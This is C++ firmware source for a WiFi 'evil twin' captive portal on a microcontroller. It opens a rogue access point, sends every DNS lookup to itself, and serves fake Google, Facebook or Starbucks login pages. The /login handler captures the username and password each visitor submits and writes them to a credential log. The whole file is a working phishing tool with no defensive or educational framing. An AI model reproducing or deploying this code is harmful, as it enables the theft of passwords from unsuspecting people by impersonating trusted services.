#include "captive_portal.h"
#include <WiFi.h>
#include <SD.h>
#include "logger.h"
#include "portal_html.h"

CaptivePortal::CaptivePortal() : server(80) {}

void CaptivePortal::begin(const char* ssid, PortalTemplate selectedTemplate, String customPath) {
    currentTemplate = selectedTemplate;
    sdPath = customPath;
    WiFi.mode(WIFI_AP);
    WiFi.softAP(ssid);
    
    IPAddress apIP = WiFi.softAPIP();
    Logger::log("AP Started. SSID: " + String(ssid));
    Logger::log("AP IP: " + apIP.toString());
    if (sdPath != "") {
        Logger::log("Template: SD Card (" + sdPath + ")");
    } else {
        Logger::log("Template: " + String(TEMPLATE_NAMES[currentTemplate]));
    }

    dnsServer.start(DNS_PORT, "*", apIP);
    
    setupRoutes();
    server.begin();
    running = true;
}

void CaptivePortal::update() {
    if (running) {
        dnsServer.processNextRequest();
    }
}

void CaptivePortal::stop() {
    server.end();
    dnsServer.stop();
    WiFi.softAPdisconnect(true);
    running = false;
}

void CaptivePortal::setupRoutes() {
    // Captive Portal Detection
    server.on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *request){
        request->redirect("/");
    });
    server.on("/fwlink", HTTP_GET, [](AsyncWebServerRequest *request){
        request->redirect("/");
    });

    // Main Portal Page
    server.on("/", HTTP_GET, [this](AsyncWebServerRequest *request){
        if (sdPath != "") {
            if (SD.exists(sdPath)) {
                request->send(SD, sdPath, "text/html");
                return;
            }
        }
        
        const char* html = GENERIC_LOGIN_HTML;
        switch(currentTemplate) {
            case TEMPLATE_GOOGLE: html = GOOGLE_LOGIN_HTML; break;
            case TEMPLATE_FACEBOOK: html = FACEBOOK_LOGIN_HTML; break;
            case TEMPLATE_STARBUCKS: html = STARBUCKS_LOGIN_HTML; break;
            default: html = GENERIC_LOGIN_HTML; break;
        }
        request->send(200, "text/html", html);
    });

    // Handle Login
    server.on("/login", HTTP_POST, [](AsyncWebServerRequest *request){
        String user = "";
        String pass = "";
        if (request->hasParam("user", true)) user = request->getParam("user", true)->value();
        if (request->hasParam("pass", true)) pass = request->getParam("pass", true)->value();
        
        Logger::log_credential(user, pass);
        
        request->send(200, "text/html", SUCCESS_HTML);
    });

    // 404 Redirect to Portal
    server.onNotFound([](AsyncWebServerRequest *request){
        request->redirect("/");
    });
}
